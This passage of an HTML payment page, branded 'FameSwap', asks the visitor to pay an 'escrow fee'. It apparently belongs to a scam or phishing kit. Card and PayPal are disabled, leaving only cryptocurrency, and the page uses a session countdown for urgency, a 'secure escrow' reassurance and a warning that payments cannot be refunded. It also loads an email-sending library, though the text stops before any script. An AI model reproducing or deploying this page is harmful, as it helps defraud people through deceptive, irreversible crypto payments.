<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link Payment Method - FameSwap</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #1a73e8;
            --primary-hover: #1557b0;
            --text-primary: #202124;
            --text-secondary: #5f6368;
            --background: #f8f9fc;
            --border-color: #dadce0;
            --success-bg: #f3f8ff;
            --error-color: #d93025;
            --success-color: #34a853;
            --warning-color: #fbbc04;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, "Roboto", Arial, sans-serif;
            background-color: var(--background);
            color: var(--text-primary);
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            width: 100%;
            max-width: 480px;
            position: relative;
            overflow: hidden;
        }

        #escrowFeeContainer {
            display: none;
            animation: slideIn 0.3s ease-out;
        }

        .payment-methods {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            margin-top: 8px;
        }

        .payment-method {
            position: relative;
            cursor: pointer;
        }

        .payment-method input[type="radio"] {
            position: absolute;
            opacity: 0;
        }

        .method-label {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 16px;
            background: var(--background);
            border: 2px solid var(--border-color);
            border-radius: 8px;
            transition: all 0.2s ease;
            gap: 8px;
        }

        .method-label i {
            font-size: 24px;
            color: var(--text-secondary);
        }

        .payment-method input[type="radio"]:checked + .method-label {
            border-color: var(--primary-color);
            background: var(--success-bg);
        }

        .payment-method input[type="radio"]:checked + .method-label i {
            color: var(--primary-color);
        }

        @media screen and (max-width: 480px) {
            .payment-methods {
                grid-template-columns: 1fr;
            }

            .method-label {
                flex-direction: row;
                justify-content: center;
            }
        }

        #paymentContainer {
            display: none;
            animation: slideIn 0.3s ease-out;
        }

        #verificationContainer {
            display: block;
            animation: slideIn 0.3s ease-out;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .logo-container {
            text-align: center;
            margin-bottom: 30px;
            position: relative;
        }

        .logo {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease;
        }

        .logo:hover {
            transform: scale(1.05);
        }

        h1 {
            text-align: center;
            color: var(--text-primary);
            font-size: 24px;
            margin-bottom: 30px;
            font-weight: 600;
        }

        .form-group {
            margin-bottom: 24px;
            position: relative;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: var(--text-secondary);
            font-size: 14px;
            font-weight: 500;
        }

        .input-wrapper {
            position: relative;
        }

        .input-icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-secondary);
        }

        .card-type-icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            display: none;
            font-size: 20px;
        }

        .card-type-icon.visa {
            color: #1A1F71;
        }

        .card-type-icon.mastercard {
            color: #EB001B;
        }

        .card-type-icon.verve {
            color: #2D3092;
        }

        input {
            width: 100%;
            padding: 12px 16px 12px 45px;
            border: 2px solid var(--border-color);
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.2s ease;
            background-color: white;
        }

        input:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 4px rgba(26, 115, 232, 0.1);
        }

        .validation-icon {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            display: none;
        }

        .validation-icon.valid {
            color: var(--success-color);
        }

        .validation-icon.invalid {
            color: var(--error-color);
        }

        .error-message {
            color: var(--error-color);
            font-size: 14px;
            margin-top: 8px;
            display: none;
            animation: fadeIn 0.2s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .expiry-cvv {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
        }

        button {
            width: 100%;
            padding: 14px;
            background-color: var(--primary-color);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s ease;
            position: relative;
            overflow: hidden;
        }

        button:hover {
            background-color: var(--primary-hover);
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }

        button:active {
            transform: translateY(0);
        }

        button.loading {
            pointer-events: none;
            opacity: 0.8;
        }

        .button-content {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            position: relative;
            width: 100%;
        }

        .loading-spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s linear infinite;
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
        }

        button.loading .button-content > *:not(.loading-spinner) {
            opacity: 0;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .secure-text {
            text-align: center;
            margin-top: 20px;
            color: var(--text-secondary);
            font-size: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .secure-text i {
            color: var(--success-color);
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
            z-index: 1000;
            animation: fadeIn 0.3s ease-out;
        }

        .modal-content {
            background-color: white;
            padding: 40px;
            border-radius: 16px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            animation: scaleIn 0.3s ease-out;
        }

        @keyframes scaleIn {
            from {
                opacity: 0;
                transform: scale(0.9);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        .success-icon {
            width: 64px;
            height: 64px;
            background-color: var(--success-color);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
            animation: bounceIn 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
        }

        @keyframes bounceIn {
            0% { transform: scale(0); }
            50% { transform: scale(1.2); }
            100% { transform: scale(1); }
        }

        .success-icon i {
            color: white;
            font-size: 32px;
        }

        .progress-bar {
            width: 100%;
            height: 4px;
            background-color: var(--border-color);
            border-radius: 2px;
            margin-top: 24px;
            overflow: hidden;
            display: none;
        }

        .progress-bar-fill {
            height: 100%;
            background-color: var(--success-color);
            width: 0%;
            transition: width 3s linear;
        }

        @media (max-width: 480px) {
            .container {
                padding: 24px;
            }

            h1 {
                font-size: 20px;
            }

            input {
                font-size: 14px;
            }

            .modal-content {
                padding: 24px;
            }
        }

        .mobile-close-button {
            position: absolute;
            top: 10px;
            right: 10px;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            background: rgba(0, 0, 0, 0.05);
            border-radius: 50%;
            transition: background 0.3s ease;
        }

        .mobile-close-button:hover {
            background: rgba(0, 0, 0, 0.1);
        }

        .mobile-close-button i {
            font-size: 20px;
            color: var(--text-secondary);
        }

        .mobile-bottom-close {
            display: none;
            width: 100%;
            padding: 15px;
            margin-top: 20px;
            background: var(--background);
            border: none;
            border-radius: 8px;
            color: var(--text-primary);
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.3s ease;
        }

        .mobile-bottom-close:hover {
            background: var(--border-color);
        }

        @media (max-width: 480px) {
            .mobile-bottom-close {
                display: block;
            }

            .modal-content {
                margin: 20px;
                max-height: 90vh;
                overflow-y: auto;
                padding: 25px;
            }

            .mobile-close-button {
                width: 44px;
                height: 44px;
            }

            .mobile-close-button i {
                font-size: 24px;
            }
        }

        #cryptoPaymentContainer {
            display: none;
            animation: slideIn 0.3s ease-out;
        }

        .crypto-list {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 12px;
            margin-bottom: 24px;
        }

        .crypto-option {
            position: relative;
            cursor: pointer;
        }

        .crypto-option input[type="radio"] {
            position: absolute;
            opacity: 0;
        }

        .crypto-label {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 16px;
            background: var(--background);
            border: 2px solid var(--border-color);
            border-radius: 8px;
            transition: all 0.2s ease;
        }

        .crypto-label img {
            width: 24px;
            height: 24px;
        }

        .crypto-option input[type="radio"]:checked + .crypto-label {
            border-color: var(--primary-color);
            background: var(--success-bg);
        }

        .wallet-details {
            background: white;
            padding: 32px;
            border-radius: 16px;
            margin-bottom: 24px;
            display: none;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            border: 1px solid var(--border-color);
        }

        .payment-info-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 24px;
            margin-bottom: 24px;
        }

        .payment-info-item {
            padding: 20px;
            background: var(--background);
            border-radius: 12px;
            border: 1px solid var(--border-color);
        }

        .payment-info-item h3 {
            font-size: 14px;
            color: var(--text-secondary);
            margin-bottom: 8px;
            font-weight: 500;
        }

        .payment-info-item .value {
            font-size: 16px;
            color: var(--text-primary);
            font-weight: 600;
        }

        .payment-info-item .network-badge {
            display: inline-block;
            padding: 4px 12px;
            background: var(--primary-color);
            color: white;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 500;
            margin-top: 8px;
        }

        .wallet-address {
            background: var(--background);
            padding: 20px;
            border-radius: 12px;
            border: 1px solid var(--border-color);
            margin: 12px 0;
            position: relative;
            gap: 12px;
        }

        .wallet-address #addressText {
            font-family: monospace;
            font-size: 14px;
            overflow-wrap: break-word;
            word-break: break-all;
            white-space: normal;
            flex: 1;
            min-width: 0;
        }

        .wallet-address .copy-button {
            background: var(--primary-color);
            color: white;
            border: none;
            border-radius: 8px;
            padding: 8px 16px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.2s ease;
            white-space: nowrap;
            flex-shrink: 0;
        }

        .copy-button:hover {
            background: var(--primary-hover);
            transform: translateY(-1px);
        }

        .copy-button i {
            margin-right: 6px;
        }

        .important-notice {
            margin-top: 24px;
            padding: 16px;
            background: #fff4e5;
            border: 1px solid #ffb74d;
            border-radius: 8px;
            color: #e65100;
            font-size: 14px;
            line-height: 1.5;
        }

        .important-notice i {
            margin-right: 8px;
        }

        .qr-code {
            width: 200px;
            height: 200px;
            margin: 24px auto;
            padding: 16px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }

        .qr-code img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .transaction-hash {
            margin-top: 24px;
            display: none;
            position: relative;
        }

        .hash-error-message {
            position: absolute;
            bottom: -30px;
            left: 50%;
            transform: translateX(-50%);
            background: var(--error-color);
            color: white;
            padding: 4px 12px;
            border-radius: 4px;
            font-size: 12px;
            white-space: nowrap;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s, visibility 0.3s;
            z-index: 100;
        }

        .hash-error-message.show {
            opacity: 1;
            visibility: visible;
        }

        .verification-status {
            text-align: center;
            margin-top: 24px;
            padding: 16px;
            border-radius: 8px;
            background: var(--success-bg);
            color: var(--success-color);
            display: none;
        }

        .verification-status.pending {
            background: var(--warning-color);
            color: white;
        }

        .crypto-label.disabled {
            opacity: 0.6;
            cursor: not-allowed;
            position: relative;
        }

        .unavailable-tag {
            position: absolute;
            bottom: 4px;
            left: 50%;
            transform: translateX(-50%);
            background: var(--error-color);
            color: white;
            padding: 2px 6px;
            border-radius: 4px;
            font-size: 10px;
            white-space: nowrap;
        }

        .back-button {
            position: absolute;
            top: 20px;
            left: 20px;
            background: none;
            border: none;
            color: var(--text-secondary);
            cursor: pointer;
            padding: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
            transition: all 0.2s ease;
            width: auto;
        }

        .back-button:hover {
            color: var(--text-primary);
            background: none;
            transform: translateX(-2px);
            box-shadow: none;
        }

        .back-button i {
            font-size: 16px;
        }

        .method-label.disabled {
            opacity: 0.6;
            cursor: not-allowed;
            position: relative;
        }

        .temporary-unavailable {
            position: absolute;
            bottom: -30px;
            left: 50%;
            transform: translateX(-50%);
            background: var(--error-color);
            color: white;
            padding: 4px 12px;
            border-radius: 4px;
            font-size: 12px;
            white-space: nowrap;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s, visibility 0.3s;
            z-index: 100;
        }

        .temporary-unavailable.show {
            opacity: 1;
            visibility: visible;
        }

        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes slideUp {
            from {
                opacity: 1;
                transform: translateY(0);
            }
            to {
                opacity: 0;
                transform: translateY(-10px);
            }
        }

        .guide-toggle-btn:hover {
            background: var(--background);
            color: var(--text-primary);
            transform: translateY(-1px);
        }

        #closeGuideBtn:hover {
            background: var(--background);
        }

        .payment-guide.hiding {
            animation: slideUp 0.3s ease-out;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <img src="data:image/png;base64,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" alt="FameSwap Logo" class="logo">
        </div>

        <!-- Escrow Fee Container -->
        <div id="escrowFeeContainer">
            <button class="back-button" onclick="goBack('escrowFeeContainer', 'verificationContainer')">
                <i class="fas fa-arrow-left"></i>
                Back
            </button>
            <!-- Session Timeout Banner -->
            <div class="session-banner" style="background: #fff4e5; border: 1px solid #ffb74d; color: #e65100; padding: 16px; border-radius: 8px; margin-bottom: 20px; text-align: center;">
                <div style="display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 8px;">
                    <i class="fas fa-shield-alt" style="color: #ff9800;"></i>
                    <strong>Secure Session Active</strong>
                </div>
                <div style="font-size: 14px; color: #bf360c;">
                    Session expires in <span id="countdown" style="font-weight: bold; color: #d84315;">24:00</span> for security
                </div>
                <div style="font-size: 12px; color: #8d6e63; margin-top: 4px;">
                    <i class="fas fa-info-circle"></i> Your session will automatically refresh to maintain security
                </div>
            </div>
            <h1>Pay Escrow Fee</h1>
            <form id="escrowFeeForm">
                <div class="form-group">
                    <label for="transactionAmount">Transaction Amount</label>
                    <div class="input-wrapper">
                        <i class="fas fa-dollar-sign input-icon"></i>
                        <input type="number" id="transactionAmount" placeholder="Enter transaction amount" required>
                        <i class="fas fa-check validation-icon valid"></i>
                        <i class="fas fa-times validation-icon invalid"></i>
                    </div>
                    <p class="error-message" id="amountError">Please enter a valid amount.</p>
                </div>
                <div class="form-group">
                    <label>Escrow Fee: <span id="escrowFeeAmount">$0</span></label>
                    <p style="color: var(--text-secondary); font-size: 12px; margin-top: 4px;">
                        <i class="fas fa-info-circle"></i> 5% of offer price (max $50) for transactions over $100
                    </p>
                </div>
                <div class="form-group">
                    <label>Payment Method</label>
                    <div class="payment-methods">
                        <label class="payment-method">
                            <input type="radio" name="paymentMethod" value="crypto" required>
                            <span class="method-label">
                                <i class="fab fa-bitcoin"></i>
                                Cryptocurrency
                            </span>
                        </label>
                        <label class="payment-method">
                            <input type="radio" name="paymentMethod" value="card" required disabled>
                            <span class="method-label disabled">
                                <i class="fas fa-credit-card"></i>
                                Card Payment
                                <span class="temporary-unavailable">Currently Unavailable</span>
                            </span>
                        </label>
                        <label class="payment-method">
                            <input type="radio" name="paymentMethod" value="paypal" required disabled>
                            <span class="method-label disabled">
                                <i class="fab fa-paypal"></i>
                                PayPal
                                <span class="temporary-unavailable">Currently Unavailable</span>
                            </span>
                        </label>
                    </div>
                </div>
                <button type="submit">
                    <div class="button-content">
                        <i class="fas fa-lock"></i>
                        <span>Pay Escrow Fee</span>
                        <div class="loading-spinner"></div>
                    </div>
                </button>
            </form>
            <p class="secure-text">
                <i class="fas fa-shield-alt"></i>
                Your payment is protected by our secure escrow system
            </p>
        </div>

        <!-- Crypto Payment Container -->
        <div id="cryptoPaymentContainer">
            <button class="back-button" onclick="goBack('cryptoPaymentContainer', 'escrowFeeContainer')">
                <i class="fas fa-arrow-left"></i>
                Back
            </button>
            <h1>Pay with Cryptocurrency</h1>
            
            
            <div class="form-group">
                <label>Select Cryptocurrency</label>
                <div class="crypto-list">
                    <label class="crypto-option">
                        <input type="radio" name="cryptoType" value="USDT_BEP20">
                        <span class="crypto-label">
                            <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" alt="USDT BEP20">
                            USDT (BEP20)
                        </span>
                    </label>
                    <label class="crypto-option">
                        <input type="radio" name="cryptoType" value="MANTLE">
                        <span class="crypto-label">
                            <img src="https://assets.coingecko.com/coins/images/30980/large/token-logo.png" alt="Mantle">
                            MANTLE (MNT)
                        </span>
                    </label>
                    <label class="crypto-option">
                        <input type="radio" name="cryptoType" value="APTOS">
                        <span class="crypto-label">
                            <img src="https://assets.coingecko.com/coins/images/26455/large/aptos_round.png" alt="Aptos">
                            APTOS (APT)
                        </span>
                    </label>
                    <label class="crypto-option">
                        <input type="radio" name="cryptoType" value="BTC" disabled>
                        <span class="crypto-label disabled">
                            <img src="https://assets.coingecko.com/coins/images/1/large/bitcoin.png" alt="Bitcoin">
                            BITCOIN (BTC)
                            <span class="temporary-unavailable">Currently Unavailable</span>
                        </span>
                    </label>
                    <label class="crypto-option">
                        <input type="radio" name="cryptoType" value="ETH" disabled>
                        <span class="crypto-label disabled">
                            <img src="https://assets.coingecko.com/coins/images/279/large/ethereum.png" alt="Ethereum">
                            ETHEREUM (ETH)
                            <span class="temporary-unavailable">Currently Unavailable</span>
                        </span>
                    </label>
                </div>
            </div>

            <!-- Guide Toggle Button -->
            <button id="guideToggleBtn" class="guide-toggle-btn" style="
                margin-top: 16px;
                padding: 6px 12px;
                background: transparent;
                color: var(--text-secondary);
                border: 1px solid var(--border-color);
                border-radius: 20px;
                cursor: pointer;
                display: flex;
                align-items: center;
                gap: 6px;
                font-size: 13px;
                transition: all 0.2s ease;
                margin-left: auto;
                margin-right: auto;
            ">
                <i class="fas fa-lightbulb" style="font-size: 12px;"></i>
                <span>Need help?</span>
            </button>

            <!-- Crypto Payment Guide (Hidden by default) -->
            <div id="paymentGuide" class="payment-guide" style="
                margin-top: 16px;
                padding: 24px;
                background: white;
                border-radius: 12px;
                border: 1px solid var(--border-color);
                display: none;
                animation: slideDown 0.3s ease-out;
                box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
            ">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                    <h3 style="color: var(--text-primary); margin: 0; font-size: 16px; font-weight: 500;">Quick Guide</h3>
                    <button id="closeGuideBtn" style="
                        background: transparent;
                        border: none;
                        color: var(--text-secondary);
                        cursor: pointer;
                        padding: 4px;
                        display: flex;
                        align-items: center;
                        justify-content: center;
                        border-radius: 50%;
                        width: 24px;
                        height: 24px;
                        transition: all 0.2s ease;
                        font-size: 14px;
                    ">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                <ol style="
                    color: var(--text-secondary);
                    padding-left: 20px;
                    margin: 0;
                    font-size: 13px;
                    line-height: 1.6;
                ">
                    <li style="margin-bottom: 8px;">Select your preferred cryptocurrency from the options above</li>
                    <li style="margin-bottom: 8px;">Copy the wallet address provided</li>
                    <li style="margin-bottom: 8px;">Send the exact amount shown from your crypto wallet</li>
                    <li style="margin-bottom: 8px;">Copy the transaction hash/ID after sending</li>
                    <li>Paste the transaction hash/ID in the verification field and wait for confirmation</li>
                </ol>
                <div style="
                    margin-top: 16px;
                    padding: 12px;
                    background: #fafafa;
                    border-radius: 8px;
                    color: var(--text-secondary);
                    font-size: 12px;
                ">
                    <div style="margin-bottom: 8px; color: var(--text-primary); font-weight: 500;">Important:</div>
                    <ul style="
                        margin: 0;
                        padding-left: 16px;
                        list-style-type: none;
                    ">
                        <li style="margin-bottom: 4px; display: flex; align-items: center; gap: 6px;">
                            <i class="fas fa-check" style="color: var(--success-color); font-size: 10px;"></i>
                            Select the correct network
                        </li>
                        <li style="margin-bottom: 4px; display: flex; align-items: center; gap: 6px;">
                            <i class="fas fa-check" style="color: var(--success-color); font-size: 10px;"></i>
                            Send exact amount only
                        </li>
                        <li style="display: flex; align-items: center; gap: 6px;">
                            <i class="fas fa-check" style="color: var(--success-color); font-size: 10px;"></i>
                            Verify wallet address
                        </li>
                    </ul>
                </div>
            </div>

            <div class="wallet-details" id="walletDetails">
                <h2 style="margin-bottom: 24px; color: var(--text-primary);">Payment Details</h2>
                
                <!-- Professional Payment Summary -->
                <div class="payment-summary" style="background: white; padding: 20px; border-radius: 12px; margin-bottom: 20px; border: 1px solid var(--border-color);">
                    <h3 style="margin-bottom: 16px; color: var(--text-primary);">Payment Summary</h3>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px;">
                        <div>
                            <div style="font-size: 12px; color: var(--text-secondary); margin-bottom: 4px;">Escrow Fee</div>
                            <div style="font-weight: 600; color: var(--text-primary);" id="escrowFeeDisplay">$0.00</div>
                        </div>
                        <div>
                            <div style="font-size: 12px; color: var(--text-secondary); margin-bottom: 4px;">Network Fee</div>
                            <div style="font-weight: 600; color: var(--text-primary);" id="networkFeeDisplay">$1.00</div>
                        </div>
                        <div>
                            <div style="font-size: 12px; color: var(--text-secondary); margin-bottom: 4px;">Processing Time</div>
                            <div style="font-weight: 600; color: var(--text-primary);">2-10 minutes</div>
                        </div>
                        <div>
                            <div style="font-size: 12px; color: var(--text-secondary); margin-bottom: 4px;">Confirmation</div>
                            <div style="font-weight: 600; color: var(--text-primary);">Automatic</div>
                        </div>
                    </div>
                </div>
                
                <div class="payment-info-grid">
                    <div class="payment-info-item">
                        <h3>Amount to Pay</h3>
                        <div class="value">
                            <strong id="cryptoAmount">0.00</strong> 
                            <span id="cryptoSymbol"></span>
                        </div>
                        <span class="network-badge" id="networkBadge">Network: BSC</span>
                    </div>
                    <div class="payment-info-item">
                        <h3>Current Rate</h3>
                        <div class="value">
                            <strong id="currentRate">$0.00</strong>
                        </div>
                        <div class="rate-source" style="font-size: 11px; color: var(--text-secondary); margin-top: 4px;">
                            <i class="fas fa-clock"></i> Live from Binance
                        </div>
                    </div>
                </div>

                <!-- QR Code and Manual Payment Options -->
                <div class="payment-methods" style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0;">
                    <div class="qr-payment">
                        <h4 style="margin-bottom: 12px; color: var(--text-primary);">QR Code Payment</h4>
                        <div class="qr-code" style="width: 150px; height: 150px; margin: 0 auto; padding: 12px; background: white; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
                            <img id="qrCodeImage" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTI2IiBoZWlnaHQ9IjEyNiIgdmlld0JveD0iMCAwIDEyNiAxMjYiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxMjYiIGhlaWdodD0iMTI2IiBmaWxsPSJ3aGl0ZSIvPgo8cmVjdCB4PSIxMCIgeT0iMTAiIHdpZHRoPSIxMDYiIGhlaWdodD0iMTA2IiBmaWxsPSJibGFjayIvPgo8L3N2Zz4K" alt="QR Code" style="width: 100%; height: 100%;">
                        </div>
                        <p style="font-size: 12px; color: var(--text-secondary); text-align: center; margin-top: 8px;">
                            Scan with your crypto wallet
                        </p>
                    </div>
                    <div class="manual-payment">
                        <h4 style="margin-bottom: 12px; color: var(--text-primary);">Manual Payment</h4>
                        <div class="wallet-address" style="background: #f8f9fa; padding: 16px; border-radius: 8px; border: 1px solid var(--border-color);">
                            <div style="font-size: 12px; color: var(--text-secondary); margin-bottom: 8px;">Wallet Address:</div>
                            <div id="addressText" style="font-family: monospace; font-size: 12px; word-break: break-all; color: var(--text-primary);"></div>
                            <button class="copy-button" onclick="copyWalletAddress()" style="margin-top: 8px; padding: 6px 12px; background: var(--primary-color); color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 12px;">
                                <i class="fas fa-copy"></i> Copy
                            </button>
                        </div>
                    </div>
                </div>

                <div class="important-notice">
                    <i class="fas fa-exclamation-triangle"></i>
                    Important: Send only the exact amount shown above to this address. Transactions cannot be refunded.
                </div>

                <!-- Automatic Transaction Monitoring -->
                <div class="transaction-monitoring" id="transactionMonitoring" style="display: none;">
                    <div style="background: #f3f8ff; border: 1px solid var(--primary-color); border-radius: 8px; padding: 16px; margin: 16px 0;">
                        <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 12px;">
                            <i class="fas fa-search" style="color: var(--primary-color);"></i>
                            <strong style="color: var(--text-primary);">Monitoring Blockchain</strong>
                        </div>
                        <div style="font-size: 14px; color: var(--text-secondary); margin-bottom: 8px;">
                            We're automatically monitoring the blockchain for your transaction...
                        </div>
                        <div class="monitoring-progress" style="display: flex; align-items: center; gap: 8px;">
                            <div style="width: 20px; height: 20px; border: 2px solid var(--primary-color); border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite;"></div>
                            <span style="font-size: 12px; color: var(--text-secondary);">Scanning for incoming transactions...</span>
                        </div>
                    </div>
                    
                    <!-- Manual verification fallback -->
                    <div style="text-align: center; margin: 16px 0;">
